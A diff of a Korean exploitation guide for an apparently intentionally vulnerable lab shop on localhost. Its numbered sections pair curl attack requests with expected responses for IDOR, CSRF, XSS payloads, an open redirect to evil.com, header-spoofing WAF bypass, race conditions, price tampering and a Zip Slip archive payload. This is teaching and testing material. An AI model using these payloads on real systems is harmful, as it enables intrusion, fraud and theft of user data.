@@ -666,7 +870,9 @@ curl -s -X PUT http://localhost:8080/api/auth/profile \
 
 ---
 
-## 19. Mass Assignment - 회원가입 시 권한 지정
+---
+
+## 22. Mass Assignment (회원가입 권한 지정) (MASS_ASSIGN_REG)
 
 **WSTG-ATHN-08** | 소스: `AuthController.register()` (86~87행)
 
@@ -703,7 +909,109 @@ curl -s -X POST http://localhost:8080/api/auth/register \
 
 ---
 
-## 20. CSRF - 이메일 강제 변경
+---
+
+## 23. BOLA/IDOR (타인 주문 조회) (BOLA_READ)
+
+**WSTG-ATHZ-04** | 소스: `OrderController.getOrderDetail()` (117~128행)
+**취약 구문**: 인증 여부만 확인하고 `order.userId == currentUser.id` 소유권 검증 누락
+
+### 공격 단계
+
+```bash
+# alice 토큰으로 로그인
+TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"alice","password":"alice123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
+
+# victim(사용자 ID 4)의 주문(ID 2) 조회 시도
+curl -s http://localhost:8080/api/orders/2 \
+  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
+```
+
+### 기대 응답
+
+```json
+{
+    "id": 2,
+    "userId": 4,
+    "totalAmount": 1350000.00,
+    "recipientName": "김피해 (VIP)",
+    "shippingAddress": "경기도 성남시 분당구 판교역로 235 비밀연구소 702호 [기밀 배송]",
+    "phone": "010-9999-8888",
+    "status": "SHIPPED",
+    "trackingCode": "KR-LOGI-77192"
+}
+```
+
+alice의 토큰으로 victim의 기밀 배송 정보(주소, 연락처, 운송장 번호)가 그대로 노출됩니다.
+
+---
+
+---
+
+## 24. BOLA/IDOR (타인 배송지 변경) (BOLA_WRITE)
+
+**WSTG-ATHZ-04** | 소스: `OrderController.updateShipping()` (134~145행)
+
+### 공격 요청
+
+```bash
+# alice 토큰으로 victim의 주문(ID 2) 배송지 변경
+curl -s -X PUT http://localhost:8080/api/orders/2/shipping \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{
+    "shippingAddress": "공격자 주소: 서울시 해커동 123-45",
+    "recipientName": "공격자",
+    "phone": "010-0000-0000"
+  }' | python3 -m json.tool
+```
+
+### 기대 응답
+
+```json
+{
+    "message": "배송 정보가 성공적으로 변경되었습니다.",
+    "orderId": 2
+}
+```
+
+---
+
+---
+
+## 25. HTTP Parameter Pollution (HPP)
+
+**WSTG-ATHZ-04** | 소스: `OrderController.updateOrderStatusHpp()` (219~233행)
+**취약 구문**: `List<String> statuses` 중 마지막 값을 적용
+
+### 공격 요청
+
+```bash
+# status 파라미터를 중복 전송하여 최종 값 조작
+curl -s -X POST "http://localhost:8080/api/orders/1/status-update?status=PENDING&status=REFUNDED" \
+  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
+```
+
+### 기대 응답
+
+```json
+{
+    "orderId": 1,
+    "receivedStatuses": ["PENDING", "REFUNDED"],
+    "appliedStatus": "REFUNDED",
+    "message": "HPP 파라미터 오염을 통해 최종 상태 'REFUNDED'가 적용되었습니다."
+}
+```
+
+첫 번째 파라미터 `PENDING`은 무시되고, 마지막 `REFUNDED`가 적용됩니다.
+
+---
+
+---
+
+## 26. CSRF (이메일 강제 변경) (CSRF)
 
 **WSTG-SESS-05** | 소스: `AuthController.changeEmailCsrf()` (162~178행)
 **취약 구문**: GET/POST 모두 허용, 인증/CSRF 토큰 검증 없음
@@ -737,71 +1045,56 @@ curl -s "http://localhost:8080/api/auth/change-email?username=victim&email=attac
 
 ---
 
-## 21. HTTP Parameter Pollution
+---
 
-**WSTG-ATHZ-04** | 소스: `OrderController.updateOrderStatusHpp()` (219~233행)
-**취약 구문**: `List<String> statuses` 중 마지막 값을 적용
+## 27. DOM-Based XSS (XSS_DOM)
+
+**WSTG-CLNT-01** | 소스: `app.js` (40~47행)
+**취약 구문**: `bar.innerHTML = '...' + raw;` (URL 해시에서 읽은 값을 그대로 삽입)
+
+### 브라우저 확인
+
+브라우저 주소창에 다음 URL을 입력합니다:
+
+```
+http://localhost:8080/#notice=<img src=x onerror=alert('DOM-XSS')>
+```
+
+### 기대 결과
+
+페이지 상단에 공지 바가 나타나면서 `alert('DOM-XSS')` 팝업이 실행됩니다.
+`window.location.hash`에서 추출한 값이 `innerHTML`에 그대로 삽입되기 때문입니다.
+
+---
+
+---
+
+## 28. Open Redirect (OPEN_REDIRECT)
+
+**WSTG-CLNT-04** | 소스: `PublicExposureController.openRedirect()` (56행)
+**취약 구문**: `targetUrl.contains("vulnmall.local")` 단순 문자열 포함 여부만 검사
 
 ### 공격 요청
 
 ```bash
-# status 파라미터를 중복 전송하여 최종 값 조작
-curl -s -X POST "http://localhost:8080/api/orders/1/status-update?status=PENDING&status=REFUNDED" \
-  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
+# 도메인 문자열을 서브도메인에 포함시켜 우회
+curl -v "http://localhost:8080/api/auth/redirect?url=http://evil.com/phishing?ref=vulnmall.local"
 ```
 
-### 기대 응답
+### 기대 결과
 
-```json
-{
-    "orderId": 1,
-    "receivedStatuses": ["PENDING", "REFUNDED"],
-    "appliedStatus": "REFUNDED",
-    "message": "HPP 파라미터 오염을 통해 최종 상태 'REFUNDED'가 적용되었습니다."
-}
+```
+< HTTP/1.1 302
+< Location: http://evil.com/phishing?ref=vulnmall.local
 ```
 
-첫 번째 파라미터 `PENDING`은 무시되고, 마지막 `REFUNDED`가 적용됩니다.
+`vulnmall.local` 문자열이 URL 어딘가에 포함되기만 하면 리다이렉트가 허용되므로, 피싱 사이트로의 유도가 가능합니다.
 
 ---
 
-## 22. WAF Bypass - 헤더 스푸핑
-
-**WSTG-CONF-05** | 소스: `EnterpriseWafFilter.doFilterInternal()` (33~35행)
-**취약 구문**: `"127.0.0.1".equals(xff)` - 클라이언트 제공 헤더를 신뢰
-
-### 공격 요청
-
-```bash
-# 관리자 API 직접 접근 시도 (차단됨)
-curl -s http://localhost:8080/api/admin/users | python3 -m json.tool
-# 기대: {"status":403,"error":"Forbidden","message":"WAF Block: ..."}
-
-# X-Forwarded-For 헤더로 내부 IP 스푸핑 (우회 성공)
-curl -s http://localhost:8080/api/admin/users \
-  -H "X-Forwarded-For: 127.0.0.1" | python3 -m json.tool
-
-# X-Custom-IP-Authorization 헤더로 우회
-curl -s http://localhost:8080/api/admin/users \
-  -H "X-Custom-IP-Authorization: 127.0.0.1" | python3 -m json.tool
-```
-
-### 기대 응답 (우회 성공 시)
-
-```json
-[
-    {"id": 1, "username": "admin", "password": "admin123", "email": "admin@vulnmall.local", "role": "ADMIN", "balance": 9999999.00},
-    {"id": 2, "username": "alice", "password": "alice123", ...},
-    {"id": 3, "username": "bob", "password": "bob123", ...},
-    {"id": 4, "username": "victim", "password": "pass1234", ...}
-]
-```
-
-모든 사용자의 평문 비밀번호, 이메일, 보안 질문 답변 등 민감 정보가 전부 노출됩니다.
-
 ---
 
-## 23. Price Tampering - 클라이언트 전송 금액 신뢰
+## 29. Price Tampering (가격 조작) (PRICE_TAMPER)
 
 **WSTG-BUSL-09** | 소스: `OrderController.checkout()` (65행)
 **취약 구문**: `BigDecimal finalAmount = request.getTotalAmount() != null ? request.getTotalAmount() : ...`
@@ -842,7 +1135,9 @@ curl -s -X POST http://localhost:8080/api/orders \
 
 ---
 
-## 24. Negative Quantity - 음수 수량
+---
+
+## 30. Negative Quantity (음수 수량) (NEG_QUANTITY)
 
 **WSTG-BUSL-09** | 소스: `CartController.updateQuantity()` (89~91행)
 **취약 구문**: 음수 검증 로직 부재
@@ -867,57 +1162,9 @@ curl -s -X PUT http://localhost:8080/api/cart/update/1 \
 
 ---
 
-## 25. Workflow Step Skipping - 결제 없이 주문 확정
-
-**WSTG-BUSL-02** | 소스: `OrderController.directConfirmOrder()` (200~211행)
-**취약 구문**: 인가 및 결제 검증 없이 `updateStatus(orderId, "PAID")` 실행
-
-### 공격 요청
-
-```bash
-# 결제되지 않은 주문을 즉시 PAID 상태로 변경
-curl -s -X POST http://localhost:8080/api/orders/1/direct-confirm | python3 -m json.tool
-```
-
-### 기대 응답
-
-```json
-{
-    "orderId": 1,
-    "status": "PAID",
-    "message": "주문이 결제 확인 완료 상태로 변경되었습니다."
-}
-```
-
-인증 없이 누구나 임의 주문의 상태를 `PAID`로 변경할 수 있습니다.
-
 ---
 
-## 26. Race Condition - 쿠폰 중복 사용
-
-**WSTG-BUSL-04** | 소스: `CouponController.redeemCoupon()` (66~82행)
-**취약 구문**: `Thread.sleep(60)` 지연 + DB Lock 부재 (TOCTOU 결함)
-
-### 공격 요청
-
-```bash
-# 동일 쿠폰(WELCOME2026)으로 동시에 5회 요청
-for i in $(seq 1 5); do
-  curl -s -X POST http://localhost:8080/api/coupons/redeem \
-    -H "Content-Type: application/json" \
-    -H "Authorization: Bearer $TOKEN" \
-    -d '{"code": "WELCOME2026"}' &
-done
-wait
-```
-
-### 기대 결과
-
-1회용 쿠폰(`discount_amount: 10,000원`)임에도 불구하고, 동시 요청으로 인해 2~5회 중복 적용되어 잔액이 여러 번 충전됩니다. `Thread.sleep(60)` 이 TOCTOU 윈도우를 의도적으로 넓힙니다.
-
----
-
-## 27. Rounding Error Arbitrage - 소수점 절삭
+## 31. 부동소수점 오차 포인트 차익거래 (ROUNDING_ERROR)
 
 **WSTG-BUSL-03** | 소스: `PointController.exchangePoints()` (46~47행)
 **취약 구문**: `(int) Math.ceil(krwAmount * 0.1)` vs `(long) krwAmount`
@@ -952,129 +1199,101 @@ curl -s -X POST http://localhost:8080/api/points/exchange \
 
 ---
 
-## 28. AES-ECB Block Shuffling
-
-**WSTG-CRYP-02** | 소스: `CryptoAuthController.issueRememberMeToken()` (44행)
-**취약 구문**: `Cipher.getInstance("AES/ECB/PKCS5Padding")` - IV 없는 ECB 모드
-
-### 검증 단계
-
-```bash
-# 1. alice (USER 역할) 토큰 발급
-curl -s -X POST "http://localhost:8080/api/auth/crypto/remember-me?username=alice" | python3 -m json.tool
-
-# 2. admin (ADMIN 역할) 토큰 발급
-curl -s -X POST "http://localhost:8080/api/auth/crypto/remember-me?username=admin" | python3 -m json.tool
-```
-
-### 기대 응답
-
-각 응답에서 `rememberMeToken` (16진수) 을 확인합니다.
-- 페이로드 형식: `role=ADMIN;user=admin` 또는 `role=USER ;user=alice`
-- AES-ECB 는 동일 평문 블록이 항상 동일 암호문으로 변환되므로, admin 토큰의 첫 16바이트 블록(`role=ADMIN;user=` 부분)을 alice 토큰의 첫 블록과 교체하면 alice 사용자에게 ADMIN 권한 부여가 가능합니다.
-
-### 토큰 검증
-
-```bash
-# 토큰 복호화 확인
-curl -s -X POST "http://localhost:8080/api/auth/crypto/remember-me/verify?token=<발급받은 토큰 HEX>" | python3 -m json.tool
-```
-
-### 기대 응답
-
-```json
-{
-    "status": "AUTHENTICATED",
-    "username": "alice",
-    "role": "ADMIN",
-    "rawDecryptedPayload": "role=ADMIN;user=alice..."
-}
-```
-
 ---
 
-## 29. Predictable Reset Token
+## 32. 동시성 Race Condition (RACE_CONDITION)
 
-**WSTG-CRYP-03** | 소스: `CryptoAuthController.generateResetLink()` (107~111행)
-**취약 구문**: `MD5(username + epochSecond)` - 예측 가능한 시드
+**WSTG-BUSL-04** | 소스: `CouponController.redeemCoupon()` (66~82행)
+**취약 구문**: `Thread.sleep(60)` 지연 + DB Lock 부재 (TOCTOU 결함)
 
 ### 공격 요청
 
 ```bash
-# 비밀번호 재설정 링크 발급
-curl -s -X POST "http://localhost:8080/api/auth/crypto/forgot-password-link?username=victim" | python3 -m json.tool
-```
-
-### 기대 응답
-
-```json
-{
-    "status": "SUCCESS",
-    "resetUrl": "/reset-password?token=a1b2c3d4e5f6...",
-    "algorithm": "MD5(username + timestamp)"
-}
-```
-
-토큰 생성 알고리즘이 `MD5(username + 현재시각_초단위)`이므로, 공격자가 요청 시점의 타임스탬프를 알면 동일한 토큰을 재현할 수 있습니다.
-
----
-
-## 30. 계정 열거 (Username Enumeration)
-
-**WSTG-ATHN-02** | 소스: `AuthController.login()` (49~64행)
-
-### 공격 요청
-
-```bash
-# 존재하는 사용자
-curl -s -X POST http://localhost:8080/api/auth/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":"admin","password":"wrongpassword"}' | python3 -m json.tool
-
-# 존재하지 않는 사용자
-curl -s -X POST http://localhost:8080/api/auth/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":"nonexistent","password":"test"}' | python3 -m json.tool
-```
-
-### 기대 응답
-
-```json
-// 존재하는 사용자 + 틀린 비밀번호
-{"status": 401, "error": "BadCredentials", "message": "비밀번호가 올바르지 않습니다."}
-
-// 존재하지 않는 사용자
-{"status": 401, "error": "UserNotFound", "message": "해당 아이디('nonexistent')는 등록되지 않은 사용자입니다."}
-```
-
-오류 메시지가 다르므로 공격자는 유효한 아이디 목록을 수집할 수 있습니다.
-
----
-
-## 31. Open Redirect
-
-**WSTG-CLNT-04** | 소스: `PublicExposureController.openRedirect()` (56행)
-**취약 구문**: `targetUrl.contains("vulnmall.local")` 단순 문자열 포함 여부만 검사
-
-### 공격 요청
-
-```bash
-# 도메인 문자열을 서브도메인에 포함시켜 우회
-curl -v "http://localhost:8080/api/auth/redirect?url=http://evil.com/phishing?ref=vulnmall.local"
+# 동일 쿠폰(WELCOME2026)으로 동시에 5회 요청
+for i in $(seq 1 5); do
+  curl -s -X POST http://localhost:8080/api/coupons/redeem \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{"code": "WELCOME2026"}' &
+done
+wait
 ```
 
 ### 기대 결과
 
-```
-< HTTP/1.1 302
-< Location: http://evil.com/phishing?ref=vulnmall.local
-```
-
-`vulnmall.local` 문자열이 URL 어딘가에 포함되기만 하면 리다이렉트가 허용되므로, 피싱 사이트로의 유도가 가능합니다.
+1회용 쿠폰(`discount_amount: 10,000원`)임에도 불구하고, 동시 요청으로 인해 2~5회 중복 적용되어 잔액이 여러 번 충전됩니다. `Thread.sleep(60)` 이 TOCTOU 윈도우를 의도적으로 넓힙니다.
 
 ---
 
-## 32. 민감정보 노출
+---
+
+## 33. Workflow Step Skipping (WORKFLOW_SKIP)
+
+**WSTG-BUSL-02** | 소스: `OrderController.directConfirmOrder()` (200~211행)
+**취약 구문**: 인가 및 결제 검증 없이 `updateStatus(orderId, "PAID")` 실행
+
+### 공격 요청
+
+```bash
+# 결제되지 않은 주문을 즉시 PAID 상태로 변경
+curl -s -X POST http://localhost:8080/api/orders/1/direct-confirm | python3 -m json.tool
+```
+
+### 기대 응답
+
+```json
+{
+    "orderId": 1,
+    "status": "PAID",
+    "message": "주문이 결제 확인 완료 상태로 변경되었습니다."
+}
+```
+
+인증 없이 누구나 임의 주문의 상태를 `PAID`로 변경할 수 있습니다.
+
+---
+
+---
+
+## 34. 엔터프라이즈 WAF 우회 (WAF_BYPASS)
+
+**WSTG-CONF-05** | 소스: `EnterpriseWafFilter.doFilterInternal()` (33~35행)
+**취약 구문**: `"127.0.0.1".equals(xff)` - 클라이언트 제공 헤더를 신뢰
+
+### 공격 요청
+
+```bash
+# 관리자 API 직접 접근 시도 (차단됨)
+curl -s http://localhost:8080/api/admin/users | python3 -m json.tool
+# 기대: {"status":403,"error":"Forbidden","message":"WAF Block: ..."}
+
+# X-Forwarded-For 헤더로 내부 IP 스푸핑 (우회 성공)
+curl -s http://localhost:8080/api/admin/users \
+  -H "X-Forwarded-For: 127.0.0.1" | python3 -m json.tool
+
+# X-Custom-IP-Authorization 헤더로 우회
+curl -s http://localhost:8080/api/admin/users \
+  -H "X-Custom-IP-Authorization: 127.0.0.1" | python3 -m json.tool
+```
+
+### 기대 응답 (우회 성공 시)
+
+```json
+[
+    {"id": 1, "username": "admin", "password": "admin123", "email": "admin@vulnmall.local", "role": "ADMIN", "balance": 9999999.00},
+    {"id": 2, "username": "alice", "password": "alice123", ...},
+    {"id": 3, "username": "bob", "password": "bob123", ...},
+    {"id": 4, "username": "victim", "password": "pass1234", ...}
+]
+```
+
+모든 사용자의 평문 비밀번호, 이메일, 보안 질문 답변 등 민감 정보가 전부 노출됩니다.
+
+---
+
+---
+
+## 35. 민감정보 노출 (.env/.git/backup.sql) (INFO_EXPOSURE)
 
 **WSTG-INFO-05 / WSTG-CONF-04** | 소스: `PublicExposureController`
 
@@ -1112,71 +1331,9 @@ DB 접속 정보, JWT 시크릿, AWS 키, 관리자 계정 등 핵심 인증 정
 
 ---
 
-## 33. CRLF / Log Injection
-
-**WSTG-INPV-15** | 소스: `LogController.recordLog()` (28행)
-**취약 구문**: `logger.info("... " + clientMsg)` - 개행 문자 미필터링
-
-### 공격 요청
-
-```bash
-curl -s -X POST http://localhost:8080/api/support/log \
-  -H "Content-Type: application/json" \
-  -d '{"message": "정상 피드백\n[AUDIT_LOGGER] INFO  ADMIN login success from 10.0.0.1 - admin@vulnmall.local"}' | python3 -m json.tool
-```
-
-### 기대 결과
-
-서버 로그 파일에 다음과 같이 가짜 관리자 로그인 기록이 삽입됩니다:
-
-```
-INFO [CLIENT_EVENT] User feedback received: 정상 피드백
-INFO ADMIN login success from 10.0.0.1 - admin@vulnmall.local
-```
-
-감사 로그를 조작하여 공격 흔적을 은폐하거나 허위 이벤트를 삽입할 수 있습니다.
-
 ---
 
-## 34. Zip Slip
-
-**WSTG-INPV-12** | 소스: `FileController.uploadZipArchive()` (119행)
-**취약 구문**: `new File(UPLOAD_DIR, entry.getName())` - ZIP 엔트리 경로에 `../../` 포함 시 상위 디렉터리 탈출
-
-### 공격 개념
-
-악성 ZIP 파일 내부에 `../../etc/cron.d/malicious` 같은 경로명을 가진 엔트리를 포함시키면, 압축 해제 시 `uploads/` 디렉터리 바깥에 파일을 쓸 수 있습니다.
-
-```bash
-# 악성 ZIP 생성 (Python 예시)
-python3 -c "
-import zipfile, io
-buf = io.BytesIO()
-with zipfile.ZipFile(buf, 'w') as zf:
-    zf.writestr('../../tmp/zipslip_proof.txt', 'Zip Slip Exploited!')
-buf.seek(0)
-open('malicious.zip', 'wb').write(buf.read())
-"
-
-# 업로드
-curl -s -X POST http://localhost:8080/api/files/upload-zip \
-  -F "file=@malicious.zip" | python3 -m json.tool
-```
-
-### 기대 응답
-
-```json
-{
-    "message": "압축 파일이 성공적으로 해제되었습니다.",
-    "extractedFiles": ["../../tmp/zipslip_proof.txt"]
-}
-```
-
-`extractedFiles`에 `../../` 경로가 포함되어 있으면 디렉터리 탈출이 성공한 것입니다.
-
----
-
-## 35. Unrestricted File Upload
+## 36. 무제한 파일 업로드 (FILE_UPLOAD)
 
 **WSTG-INPV-12** | 소스: `FileController.uploadFile()` (85~90행)
 **취약 구문**: 확장자 화이트리스트 검증 없이 원본 파일명 유지
@@ -1208,7 +1365,10 @@ JSP, SVG 등 서버 사이드 실행 가능한 파일도 제한 없이 업로드
 
 ---
 
-## 36. 배송지 주소록 BOLA / IDOR (BOLA_ADDRESS)
+---
+
+## 37. BOLA/IDOR (타인 배송지 조회/수정/삭제) (BOLA_ADDRESS)
+
 **WSTG-ATHZ-04** | 엔드포인트: `DELETE /api/addresses/{id}` / `PUT /api/addresses/{id}`
 
 타인의 배송지 주소 식별자(`id`)를 전달하여 본인 소유가 아닌 타인의 등록된 배송지를 무단 열람하거나 삭제/수정합니다.
@@ -1220,7 +1380,10 @@ curl -s -X DELETE http://localhost:8080/api/addresses/1 \
 
 ---
 
-## 37. 배송지 메모 Stored XSS (XSS_STORED_ADDRESS)
+---
+
+## 38. Stored XSS (배송지 및 배송 메모) (XSS_STORED_ADDRESS)
+
 **WSTG-INPV-02** | 엔드포인트: `POST /api/addresses`
 
 배송 요청 메모(`deliveryMemo`)에 악성 스크립트를 삽입하여 저장한 후, 주소록 관리 및 주문서에서 렌더링 시 실행됩니다.
@@ -1239,7 +1402,10 @@ curl -s -X POST http://localhost:8080/api/addresses \
 
 ---
 
-## 38. 주소록 검색 SQL Injection (SQLI_ADDRESS)
+---
+
+## 39. SQL Injection (주소 및 우편번호 검색) (SQLI_ADDRESS)
+
 **WSTG-INPV-05** | 엔드포인트: `GET /api/addresses/search`
 
 도로명 주소 검색 시 싱글 쿼트(`'`)를 이용해 SQL 구문 조작 및 데이터베이스 에러를 유발합니다.
@@ -1250,7 +1416,10 @@ curl -s "http://localhost:8080/api/addresses/search?keyword='" \
 
 ---
 
-## 39. 지갑 잔액 음수 충전 결제 변조 (WALLET_NEGATIVE_CHARGE)
+---
+
+## 40. 결제 금액 음수 충전 및 PG 변조 (WALLET_NEGATIVE_CHARGE)
+
 **WSTG-BUSL-09** | 엔드포인트: `POST /api/wallet/charge`
 
 충전 금액(`amount`) 또는 결제 승인 금액(`paidAmount`)에 음수 및 변조된 값을 입력하여 시스템 로직 오류를 발생시킵니다.
@@ -1263,7 +1432,10 @@ curl -s -X POST http://localhost:8080/api/wallet/charge \
 
 ---
 
-## 40. 프로모션 바우처 동시성 Race Condition (WALLET_RACE_CONDITION)
+---
+
+## 41. 바우처 동시성 Race Condition (WALLET_RACE_CONDITION)
+
 **WSTG-BUSL-04** | 엔드포인트: `POST /api/wallet/voucher`
 
 1회용 프로모션 바우처 코드를 동시에 여러 스레드로 등록 요청하여 중복으로 지갑 잔액을 증식시킵니다.
@@ -1279,7 +1451,10 @@ wait
 
 ---
 
-## 41. CSRF 지갑 잔액 무단 송금 (CSRF_WALLET)
+---
+
+## 42. CSRF (지갑 잔액 무단 송금) (CSRF_WALLET)
+
 **WSTG-SESS-05** | 엔드포인트: `POST /api/wallet/transfer`
 
 안티 CSRF 토큰 부재를 악용하여 로그인된 피해자가 악성 웹페이지 방문 시 피해자 잔액을 공격자 지갑으로 강제 이체시킵니다.
@@ -1292,7 +1467,10 @@ curl -s -X POST http://localhost:8080/api/wallet/transfer \
 
 ---
 
-## 42. 장바구니 요청 메모 Stored XSS (XSS_STORED_CART)
+---
+
+## 43. Stored XSS (장바구니 요청 메모) (XSS_STORED_CART)
+
 **WSTG-INPV-02** | 엔드포인트: `POST /api/cart`
 
 장바구니 담기 시 요청사항 메모 필드에 자바스크립트 페이로드를 전달하여 장바구니 모달에서 실행시킵니다.
@@ -1305,7 +1483,10 @@ curl -s -X POST http://localhost:8080/api/cart \
 
 ---
 
-## 43. 장바구니 품목 조작 BOLA / IDOR (BOLA_CART)
+---
+
+## 44. BOLA/IDOR (타인 장바구니 품목 변조/삭제) (BOLA_CART)
+
 **WSTG-ATHZ-04** | 엔드포인트: `DELETE /api/cart/items/{id}`
 
 타인의 장바구니 아이템 ID를 인자로 넘겨 소유권 확인 없이 타인의 품목을 삭제하거나 수량을 변경합니다.
@@ -1316,7 +1497,10 @@ curl -s -X DELETE http://localhost:8080/api/cart/items/2 \
 
 ---
 
-## 44. 통합 관리자 포털 권한 우회 (ADMIN_BYPASS)
+---
+
+## 45. 통합 관리자 포털 권한 우회 (ADMIN_BYPASS)
+
 **WSTG-ATHZ-02** | 엔드포인트: `GET /api/admin/check`
 
 `X-Admin-Role: true` 또는 `X-Forwarded-For: 127.0.0.1` 헤더를 조작하여 일반 사용자 권한으로 관리자 영역에 침투합니다.
@@ -1327,7 +1511,10 @@ curl -s http://localhost:8080/api/admin/check \
 
 ---
 
-## 45. VIP 멤버십 가입비 변조 (MEMBERSHIP_PRICE_TAMPER)
+---
+
+## 46. Membership Price Tampering (가입 금액 변조) (MEMBERSHIP_PRICE_TAMPER)
+
 **WSTG-BUSL-09** | 엔드포인트: `POST /api/membership/subscribe`
 
 정상가 ₩9,900원의 월 구독료를 0원 또는 음수로 조작하여 공짜로 VIP PRIME 권한을 획득합니다.
@@ -1340,7 +1527,10 @@ curl -s -X POST http://localhost:8080/api/membership/subscribe \
 
 ---
 
-## 46. VIP 시크릿 특가관 BFLA 인가 우회 (MEMBERSHIP_BFLA_BYPASS)
+---
+
+## 47. VIP Exclusive Deals BFLA (인가 우회) (MEMBERSHIP_BFLA_BYPASS)
+
 **WSTG-ATHZ-02** | 엔드포인트: `GET /api/membership/exclusive-products`
 
 비구독자 상태에서 일반 미공개 VIP 단독 특가관 API를 직접 호출하여 특가 품목을 열람합니다.
@@ -1351,7 +1541,10 @@ curl -s http://localhost:8080/api/membership/exclusive-products \
 
 ---
 
-## 47. VIP 바우처 동시성 Race Condition (MEMBERSHIP_COUPON_RACE)
+---
+
+## 48. VIP Coupon Race Condition (쿠폰 무한 중복 발급) (MEMBERSHIP_COUPON_RACE)
+
 **WSTG-BUSL-04** | 엔드포인트: `POST /api/membership/claim-coupon`
 
 VIP 가입 시 1회만 제공되는 ₩50,000 바우처를 동시 다중 요청을 통해 수십 장 중복 발급받습니다.
@@ -1365,7 +1558,10 @@ wait
 
 ---
 
-## 48. VIP 환영 인사말 Stored XSS (MEMBERSHIP_STORED_XSS)
+---
+
+## 49. Membership Welcome Note Stored XSS (MEMBERSHIP_STORED_XSS)
+
 **WSTG-INPV-02** | 엔드포인트: `POST /api/membership/subscribe`
 
 VIP 소개글(`welcomeNote`)에 `<img src=x onerror=alert(1)>` 스크립트를 전달하여 프로필 및 관리자 화면에서 실행시킵니다.
@@ -1378,7 +1574,10 @@ curl -s -X POST http://localhost:8080/api/membership/subscribe \
 
 ---
 
-## 49. 이중 환불 동시성 Race Condition (REFUND_RACE_CONDITION)
+---
+
+## 50. Double Refund Concurrency Race Condition (이중 환불) (REFUND_RACE_CONDITION)
+
 **WSTG-BUSL-04** | 엔드포인트: `POST /api/orders/{id}/refund`
 
 동일 주문에 대해 동시 다발적인 환불 요청을 마이크로초 단위로 전송하여 결제 금액을 2회 이상 중복 환불받아 지갑 잔액을 부당 증식시킵니다.
@@ -1394,7 +1593,10 @@ wait
 
 ---
 
-## 50. 반품 검수 절차 우회 (REFUND_WORKFLOW_BYPASS)
+---
+
+## 51. Refund State & Workflow Step Skipping (반품 검수 우회) (REFUND_WORKFLOW_BYPASS)
+
 **WSTG-BUSL-02** | 엔드포인트: `POST /api/orders/{id}/refund`
 
 배송 완료(`DELIVERED`)된 상품의 회수/검수 절차를 `direct: true` 파라미터 주입으로 건너뛰고 즉시 전액 환불을 승인받습니다.
@@ -1407,7 +1609,10 @@ curl -s -X POST http://localhost:8080/api/orders/1/refund \
 
 ---
 
-## 51. 환불 사유 메모 Stored XSS (REFUND_STORED_XSS)
+---
+
+## 52. Refund Reason & Memo Stored XSS (REFUND_STORED_XSS)
+
 **WSTG-INPV-02** | 엔드포인트: `POST /api/orders/{id}/refund`
 
 환불 상세 사유에 스크립트를 삽입하여 사용자의 주문 내역 및 관리자의 주문 관리 포털에서 실행시킵니다.
@@ -1420,7 +1625,10 @@ curl -s -X POST http://localhost:8080/api/orders/1/refund \
 
 ---
 
-## 52. 커스텀 덱 BOLA / IDOR (WISHLIST_BOLA_IDOR)
+---
+
+## 53. Wishlist & Custom Deck BOLA/IDOR (비공개 덱 무단 열람) (WISHLIST_BOLA_IDOR)
+
 **WSTG-ATHZ-04** | 엔드포인트: `GET /api/wishlist/decks/{id}`
 
 타인(VIP Victim)이 작성한 비공개(Private) 기밀 덱 ID를 직접 호출하여 소유권 검증 없이 기밀 메모(`secretNote`)를 탈취합니다.
@@ -1431,7 +1639,10 @@ curl -s http://localhost:8080/api/wishlist/decks/2 \
 
 ---
 
-## 53. 커스텀 덱 소개글 Stored XSS (WISHLIST_STORED_XSS)
+---
+
+## 54. Custom Deck Name & Description Stored XSS (WISHLIST_STORED_XSS)
+
 **WSTG-INPV-02** | 엔드포인트: `POST /api/wishlist/decks`
 
 덱 이름 또는 공개 설명에 악성 스크립트를 삽입하여 덱 목록 및 공유 링크 열람 시 실행시킵니다.
@@ -1449,7 +1660,10 @@ curl -s -X POST http://localhost:8080/api/wishlist/decks \
 
 ---
 
-## 54. 출석체크 날짜 변조 및 중복 수령 (ATTENDANCE_DATE_TAMPER)
+---
+
+## 55. Attendance Check-in Date Manipulation & Multi-Claim Race (ATTENDANCE_DATE_TAMPER)
+
 **WSTG-BUSL-04** | 엔드포인트: `POST /api/points/attendance`
 
 클라이언트가 `customDate`에 미래/과거 날짜를 주입하거나 동시성 레이스로 하루 다중 출석 보상(+1,000P)을 수령합니다.
@@ -1462,7 +1676,10 @@ curl -s -X POST http://localhost:8080/api/points/attendance \
 
 ---
 
-## 55. 룰렛 당첨 포인트 클라이언트 조작 (ROULETTE_CLIENT_TAMPER)
+---
+
+## 56. Roulette Client-Side Prize Manipulation (ROULETTE_CLIENT_TAMPER)
+
 **WSTG-CLNT-01** | 엔드포인트: `POST /api/points/roulette`
 
 서버가 난수로 검증하지 않고 클라이언트 요청 페이로드(`requestedPrizePoints: 50000`)를 신뢰하여 대량 포인트를 부당 취득합니다.
@@ -1475,7 +1692,10 @@ curl -s -X POST http://localhost:8080/api/points/roulette \
 
 ---
 
-## 56. 음수 포인트 복합 결제 악용 (POINTS_NEGATIVE_EXPLOIT)
+---
+
+## 57. Negative Points Usage & Compound Payment Tampering (POINTS_NEGATIVE_EXPLOIT)
+
 **WSTG-BUSL-09** | 엔드포인트: `POST /api/orders`
 
 주문 결제 시 `pointsUsed`에 음수(-100,000)를 주입하여 수식 역전으로 총 결제액을 조작하거나 잔액을 증식시킵니다.
@@ -1494,7 +1714,10 @@ curl -s -X POST http://localhost:8080/api/orders \
 
 ---
 
-## 57. 1:1 비밀 고객지원 티켓 BOLA / IDOR (INQUIRY_BOLA_IDOR)
+---
+
+## 58. BOLA/IDOR on Support Ticket & Secret Inquiries (INQUIRY_BOLA_IDOR)
+
 **WSTG-ATHZ-04** | 엔드포인트: `GET /api/inquiries/{id}`
 
 `GET /api/inquiries/{id}` 호출 시 소유권 및 비밀글 여부를 검증하지 않아 타인(VIP)의 비밀 티켓을 무단 열람합니다.
